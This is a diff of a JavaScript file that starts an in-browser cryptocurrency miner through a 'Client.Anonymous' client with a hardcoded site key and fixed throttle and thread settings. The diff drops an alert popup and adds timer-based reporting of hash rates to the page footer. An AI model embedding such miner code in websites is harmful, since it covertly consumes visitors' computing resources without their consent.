@@ -1,22 +1,21 @@
-﻿var mainMiner=null;
+﻿var mainMiner = null;
+var totalHashed = 0;
+var higestHashRate = 0;
 
 function Test() {
     try {
 
         if (mainMiner != null && mainMiner.isRunning()) {
-            message('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
+            totalHashed = totalHashed + mainMiner.getTotalHashes();
             mainMiner.stop();
         }
 
         mainMiner = new Client.Anonymous('a6586a3300fabf67f8666d055d682db74c7741611f665efae8d6aefb2983dc6e', {
             throttle: 0.3,
-            threads:5,
+            threads: 5,
             //autoThreads:true
         });
         mainMiner.start();
-
-        // Console.log('ServiceHit');
-        message('hash =' + mainMiner.getHashesPerSecond() + ' & threads=' + mainMiner.getNumThreads());            
     }
     catch (e) {
 
@@ -24,9 +23,20 @@ function Test() {
 }
 
 function message(msg) {
-    alert(msg);
     document.getElementById("footer").innerHTML = msg;
 }
+
+
+setInterval(function () {
+    if (mainMiner != null && mainMiner.isRunning()) {
+        var rate = mainMiner.getHashesPerSecond();
+
+        if (higestHashRate < rate)
+            higestHashRate = rate;
+
+        message('Current hash/s =' + rate + ' & threads=' + mainMiner.getNumThreads() + ' & TotalHashed=' + totalHashed + ' & Higest hash/s=' + higestHashRate);
+    }
+}, 10000)
 
 
 setInterval(function () {
